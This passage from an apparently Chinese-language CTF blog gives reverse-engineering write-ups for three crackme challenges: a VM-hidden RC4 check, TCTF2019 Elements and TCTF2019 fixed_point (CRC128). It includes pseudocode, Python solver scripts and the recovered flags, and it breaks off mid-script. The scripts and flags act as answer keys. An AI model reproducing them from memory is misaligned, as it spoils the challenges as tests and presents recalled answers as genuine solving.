class="line">r0 = r4 = r5 = 0</span><br><span class="line">do&#123;</span><br><span class="line">    r4 += 1</span><br><span class="line">    r6 = v_3700[r4]</span><br><span class="line">    r5 += r6</span><br><span class="line">    r7 = v_3700[r5]</span><br><span class="line">    v_3700[r5] = r6</span><br><span class="line">    v_3700[r4] = r7</span><br><span class="line">    v_4800[r0] = buf[r0] ^ v_3700[r6 + r7]</span><br><span class="line">&#125;while (++r0 != len)</span><br><span class="line">r0 = 0</span><br><span class="line">r1 = v_4800</span><br><span class="line">r2 = v_3915</span><br><span class="line">r3 = 0x57</span><br><span class="line">do&#123;</span><br><span class="line">    r4 = *(byte*)r1</span><br><span class="line">    r5 = *(byte*)r2</span><br><span class="line">    r1 += 1</span><br><span class="line">    r2 += 1</span><br><span class="line">    if (r4 != r5) goto loc_20CE</span><br><span class="line">&#125;while (++r0 != r3)</span><br><span class="line">write(&quot;Yea\n&quot;)</span><br><span class="line">halt()</span><br><span class="line">loc_20CE:</span><br><span class="line">write(&quot;Nah\n&quot;)</span><br><span class="line">halt()</span><br></pre></td></tr></table></figure><p>可以看出这是RC4加密，状态向量是<code>v_3700</code>，flag的长度是87，加密后放在<code>v_4800</code>，比较的内容是<code>v_3915</code>。那我们写个脚本再逆回去就好了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">0x07</span>, <span class="number">0x2B</span>, <span class="number">0xC4</span>, <span class="number">0x5F</span>, <span class="number">0x11</span>, <span class="number">0xB1</span>, <span class="number">0xDC</span>, <span class="number">0x15</span>, <span class="number">0x28</span>, <span class="number">0xB7</span>, <span class="number">0x62</span>, <span class="number">0x59</span>, <span class="number">0xED</span>, <span class="number">0x3F</span>, <span class="number">0xAD</span>, <span class="number">0x9E</span>, <span class="number">0x38</span>, <span class="number">0x70</span>, <span class="number">0xD8</span>, <span class="number">0x68</span>, <span class="number">0xCA</span>, <span class="number">0xD3</span>, <span class="number">0x36</span>, <span class="number">0x67</span>, <span class="number">0x09</span>, <span class="number">0xD7</span>, <span class="number">0x16</span>, <span class="number">0x94</span>, <span class="number">0x11</span>, <span class="number">0xB1</span>, <span class="number">0x14</span>, <span class="number">0xB3</span>, <span class="number">0x34</span>, <span class="number">0xF5</span>, <span class="number">0x48</span>, <span class="number">0xE9</span>, <span class="number">0x64</span>, <span class="number">0x19</span>, <span class="number">0x2D</span>, <span class="number">0xC3</span>, <span class="number">0xA7</span>, <span class="number">0xB7</span>, <span class="number">0xB4</span>, <span class="number">0x10</span>, <span class="number">0xFB</span>, <span class="number">0x5C</span>, <span class="number">0xDF</span>, <span class="number">0x55</span>, <span class="number">0x18</span>, <span class="number">0xB5</span>, <span class="number">0xF3</span>, <span class="number">0x54</span>, <span class="number">0xC7</span>, <span class="number">0x51</span>, <span class="number">0x5D</span>, <span class="number">0xB0</span>, <span class="number">0x71</span>, <span class="number">0x13</span>, <span class="number">0xFE</span>, <span class="number">0x1F</span>, <span class="number">0x68</span>, <span class="number">0x25</span>, <span class="number">0x46</span>, <span class="number">0x63</span>, <span class="number">0xFD</span>, <span class="number">0x2E</span>, <span class="number">0xAA</span>, <span class="number">0x83</span>, <span class="number">0xF9</span>, <span class="number">0x0A</span>, <span class="number">0x2B</span>, <span class="number">0x04</span>, <span class="number">0xB0</span>, <span class="number">0x42</span>, <span class="number">0x15</span>, <span class="number">0x7A</span>, <span class="number">0x8D</span>, <span class="number">0x85</span>, <span class="number">0x02</span>, <span class="number">0x91</span>, <span class="number">0xDB</span>, <span class="number">0x41</span>, <span class="number">0xF9</span>, <span class="number">0xB4</span>, <span class="number">0xA6</span>, <span class="number">0x44</span>, <span class="number">0xE9</span>]</span><br><span class="line"></span><br><span class="line">box = [<span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>, <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>]</span><br><span class="line"></span><br><span class="line">r0, r4, r5 = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r4 += <span class="number">1</span></span><br><span class="line">    r6 = box[r4]</span><br><span class="line">    r5 = r5 + r6 &amp; <span class="number">255</span></span><br><span class="line">    r7 = box[r5]</span><br><span class="line">    box[r5] = r6</span><br><span class="line">    box[r4] = r7</span><br><span class="line">    flag[r0] ^= box[r6 + r7 &amp; <span class="number">255</span>]</span><br><span class="line">    r0 += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> r0 == <span class="built_in">len</span>(flag): <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag).decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure><p>附上逆向时的IDB文件：<a download href="/archives/Mixed01/matreshka.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a></p><blockquote><p>ctfzone{7h15_15_8451c411y_p427_0f_2c4_w21773n_1n_vm_1n_vm_8u7_w17h_435_580x_h4h4_funny}</p></blockquote><h2 id="TCTF2019-Elements"><a href="#TCTF2019-Elements" class="headerlink" title="TCTF2019 Elements"></a>TCTF2019 Elements</h2><blockquote><a download href="/archives/Mixed01/Elements.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a></blockquote><p>IDA载入程序，容易发现flag的格式为<code>&#39;flag｛%012x-%012x-%012x｝&#39; % (a, b, c)</code>。然后$a$的值已知，要求$b$和$c$，约束条件是：</p><script type="math/tex; mode=display">\left\{\begin{aligned}a < b < c \\\frac{2d}{a + b + c} = T_1 \\\frac{abc}{4d} = T_2 \\\end{aligned}\right.</script><p>其中$T_1$，$T_2$是已知量，$d$满足：</p><script type="math/tex; mode=display">d = \frac{\sqrt{4a ^ 2 b ^ 2 - (a ^ 2 + b ^ 2 - c ^ 2) ^ 2}}{4}</script><p>然而我用z3写的脚本不太能解出来，于是尝试用别的办法。注意到$a$的值已知，而两个方程都是齐次的，于是可以先把$a$除掉，再来解二元方程组：</p><script type="math/tex; mode=display">\left\{\begin{aligned}1 < x < y \\\frac{\sqrt{4x ^ 2 - (1 + x ^ 2 - y ^ 2) ^ 2}}{2(1 + x + y)} = T_1' \\\frac{xy}{\sqrt{4x ^ 2 - (1 + x ^ 2 - y ^ 2) ^ 2}} = T_2' \\\end{aligned}\right.</script><p>这样所有数量级就被处理掉了，常数都转化为了正常大小的小数。然后这个方程组手解可能挺麻烦的，好在我们可以用<a href="https://www.wolframalpha.com/">Walfram Alpha</a>求它的解析解，进入网站后输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solve sqrt(x^2-(1+x^2-y^2)^2/4)/(1+x+y)=a,xy/sqrt(4x^2-(1+x^2-y^2)^2)=b</span><br></pre></td></tr></table></figure><p>得到它的四组解析解。其中有两组复数解不管，另外两组只是$x$、$y$互换，选$x &lt; y$的那组即可：</p><script type="math/tex; mode=display">\left\{\begin{aligned}x&=&\sqrt{4a^2b^2-a^2}-\frac{1}{2}\sqrt{4\sqrt{4a^2b^2-a^2}-4a^2-8ab+1}+\frac{1}{2}(4ab+1) \\y&=&\sqrt{4a^2b^2-a^2}+\frac{1}{2}\sqrt{4\sqrt{4a^2b^2-a^2}-4a^2-8ab+1}+\frac{1}{2}(4ab+1) \\\end{aligned}\right.</script><p>代入$T_1’$和$T_2’$的值，即可解出原来的$x$和$y$。把它们乘以$a$，可以求出$b$和$c$。但求出后我们不能直接得到flag，原因是程序有double数到格式串的转化过程，我们要按照它的方式生成格式串。查看关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v17 = (__m128i)_mm_sub_pd(</span><br><span class="line">               (__m128d)_mm_unpacklo_epi32((__m128i)(<span class="keyword">unsigned</span> __int64)num, (__m128i)xmmword_400BD0),</span><br><span class="line">               (__m128d)xmmword_400BE0);</span><br><span class="line">v23[v9++] = *(<span class="keyword">double</span> *)_mm_shuffle_epi32(v17, <span class="number">78</span>).m128i_i64 + *(<span class="keyword">double</span> *)v17.m128i_i64;<span class="comment">// 1001110</span></span><br></pre></td></tr></table></figure><p><code>num</code>就是读入的<code>a</code>，<code>b</code>，<code>c</code>。经分析，此过程实际上把它们转换成<code>double</code>型的变量。这几句代码可能是编译器对<code>uint64_t</code>到<code>double</code>转换的内联代码。于是我们求出的值直接四舍五入然后转成12位十六进制数就行了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q2d</span>(<span class="params">val</span>):</span></span><br><span class="line">    b = <span class="built_in">memoryview</span>(<span class="built_in">bytearray</span>(<span class="number">8</span>))</span><br><span class="line">    v, f = b.cast(<span class="string">&#x27;Q&#x27;</span>), b.cast(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    v[<span class="number">0</span>] = val</span><br><span class="line">    <span class="keyword">return</span> f[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">sqrt = <span class="keyword">lambda</span> x: x ** (<span class="number">1</span>/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">unit = q2d(<span class="number">0x3FF0000000000000</span>)</span><br><span class="line">a, b = <span class="built_in">map</span>(q2d, (<span class="number">0x42B1A4FF41C1018B</span>, <span class="number">0x42C5B939050828F4</span>))</span><br><span class="line">c = <span class="number">0x391BC2164F0A</span></span><br><span class="line">scale = c * unit</span><br><span class="line">a /= scale; b /= scale</span><br><span class="line">a2, b2, ab, a2b2 = a * a, b * b, a * b, a * a * b * b</span><br><span class="line">x = sqrt(<span class="number">4</span>*a2b2-a2)-sqrt(<span class="number">4</span>*sqrt(<span class="number">4</span>*a2b2-a2)-<span class="number">4</span>*a2-<span class="number">8</span>*ab+<span class="number">1</span>)/<span class="number">2</span>+(<span class="number">4</span>*ab+<span class="number">1</span>)/<span class="number">2</span></span><br><span class="line">y = sqrt(<span class="number">4</span>*a2b2-a2)+sqrt(<span class="number">4</span>*sqrt(<span class="number">4</span>*a2b2-a2)-<span class="number">4</span>*a2-<span class="number">8</span>*ab+<span class="number">1</span>)/<span class="number">2</span>+(<span class="number">4</span>*ab+<span class="number">1</span>)/<span class="number">2</span></span><br><span class="line">x, y = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x / unit * scale), (x, y))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;%012X-%012X-%012X&#125;&#x27;</span> % (c, x, y))</span><br></pre></td></tr></table></figure><blockquote><p>flag{391BC2164F0A-4064E4798769-56E0DE138176}</p></blockquote><h2 id="TCTF2019-fixed-point"><a href="#TCTF2019-fixed-point" class="headerlink" title="TCTF2019 fixed_point"></a>TCTF2019 fixed_point</h2><blockquote><a download href="/archives/Mixed01/fixed_point.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a></blockquote><p>程序接受一个格式为<code>flag&#123;长度为32的小写hex字符串&#125;</code>的flag。随后程序把它换成<code>flag&#123;hex表示的16字节二进制数据&#125;</code>，并求出它的CRC128，如果求出的值与原flag值相等，则校验通过。python代码表示为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;flag&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">raw = unhexlify(flag[<span class="number">5</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">assert</span> raw == CRC128(<span class="string">b&#x27;flag&#123;&#x27;</span>+raw+<span class="string">b&#x27;&#125;&#x27;</span>).to_bytes(<span class="number">16</span>, <span class="string">&#x27;little&#x27;</span>)</span><br></pre></td></tr></table></figure><p>我一开始想到的是Z3求解，因为之前写过一个已知CRC32枚举原字符串的题，那个用Z3确实能胜任。于是我故技重施，写出了如下的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z3_crc128</span>(<span class="params">data, length</span>):</span></span><br><span class="line">    result = z3.BitVecVal(-<span class="number">1</span>, <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">for</span> _, byte <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="built_in">range</span>(length), data):</span><br><span class="line">        result ^= z3.ZeroExt(<span class="number">120</span>, byte)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            result = z3.If(</span><br><span class="line">                result &amp; <span class="number">1</span> == <span class="number">1</span>,</span><br><span class="line">                z3.LShR(result, <span class="number">1</span>) ^ <span class="number">0xB595CF9C8D708E2166D545CF7CFDD4F9</span>,</span><br><span class="line">                z3.LShR(result, <span class="number">1</span>)</span><br><span class="line">            )</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">flag = z3.Array(<span class="string">&#x27;flag&#x27;</span>, z3.IntSort(), z3.BitVecSort(<span class="number">8</span>))</span><br><span class="line">solver = z3.Solver()</span><br><span class="line"><span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">b&#x27;flag&#123;&#x27;</span>):</span><br><span class="line">    solver.add(flag[i] == v)</span><br><span class="line">solver.add(flag[<span class="number">21</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line">crc = z3_crc128(flag, <span class="number">22</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    solver.add(flag[<span class="number">5</span> + i] == z3.Extract(i * <span class="number">8</span> + <span class="number">7</span>, i * <span class="number">8</span>, crc))</span><br><span class="line"><span class="keyword">assert</span> solver.check() == z3.sat</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;%032x&#125;&#x27;</span> % solver.model().<span class="built_in">eval</span>(crc).as_long())</span><br></pre></td></tr></table></figure><p>结果不太乐观，脚本挂了一天一夜也没能跑出来，那么只能尝试别的方法了。然后我又试了下面的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z3_crc128c</span>(<span class="params">data, length</span>):</span></span><br><span class="line">    crctable = z3.Array(<span class="string">&#x27;crctable&#x27;</span>, z3.BitVecSort(<span class="number">8</span>), z3.BitVecSort(<span class="number">128</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        value = i</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> value &amp; <span class="number">1</span>:</span><br><span class="line">                value = value &gt;&gt; <span class="number">1</span> ^ <span class="number">0xB595CF9C8D708E2166D545CF7CFDD4F9</span></span><br><span class="line">            <span class="keyword">else</span>: value &gt;&gt;= <span class="number">1</span></span><br><span class="line">        crctable = z3.Store(crctable, i, value)</span><br><span class="line">    result = z3.BitVecVal(-<span class="number">1</span>, <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">for</span> _, byte <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="built_in">range</span>(length), data):</span><br><span class="line">        result = z3.LShR(result, <span class="number">8</span>) ^ crctable[z3.Extract(<span class="number">7</span>, <span class="number">0</span>, result) ^ byte]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">flag = z3.Array(<span class="string">&#x27;flag&#x27;</span>, z3.IntSort(), z3.BitVecSort(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">b&#x27;flag&#123;&#x27;</span>):</span><br><span class="line">    flag = z3.Store(flag, i, v)</span><br><span class="line">flag = z3.Store(flag, <span class="number">21</span>, <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line">solver = z3.Solver()</span><br><span class="line">crc = z3_crc128c(flag, <span class="number">22</span>)</span><br><span class="line">solver.add(z3.Concat(*(flag[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">5</span>, <span class="number">21</span>)))) == crc)</span><br><span class="line"><span class="keyword">assert</span> solver.check() == z3.sat</span><br><span class="line">r128 = <span class="keyword">lambda</span> x: <span class="built_in">int</span>.from_bytes(x.to_bytes(<span class="number">16</span>, <span class="string">&#x27;little&#x27;</span>), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;%032x&#125;&#x27;</span> % r128(solver.model().<span class="built_in">eval</span>(crc).as_long()))</span><br></pre></td></tr></table></figure><p>还是不行。就这么挣扎了几天，最后只能去网上找WP，找到了<a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#fixed-point">这个</a>。按照上面所说的CRC的性质，构造一个CRC128矩阵，然后解128个异或方程。但是我用Z3好像还是解不出来，也不知道为啥，于是我用传统的高斯消元法弄了一下，最后得到了flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify</span><br><span class="line"></span><br><span class="line">crctable = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    value = i</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> value &amp; <span class="number">1</span>:</span><br><span class="line">            value = value &gt;&gt; <span class="number">1</span> ^ <span class="number">0xB595CF9C8D708E2166D545CF7CFDD4F9</span></span><br><span class="line">        <span class="keyword">else</span>: value &gt;&gt;= <span class="number">1</span></span><br><span class="line">    crctable.append(value)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc128</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">global</span> crctable</span><br><span class="line">    result = -<span class="number">1</span> % (<span class="number">1</span> &lt;&lt; <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        result = result &gt;&gt; <span class="number">8</span> ^ crctable[(result ^ byte) &amp; <span class="number">255</span>]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_crc128</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> crc128(data) ^ crc128(<span class="built_in">bytes</span>(<span class="number">22</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># solve mx = v</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">m, v</span>):</span></span><br><span class="line">    d = <span class="built_in">len</span>(m)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(d - <span 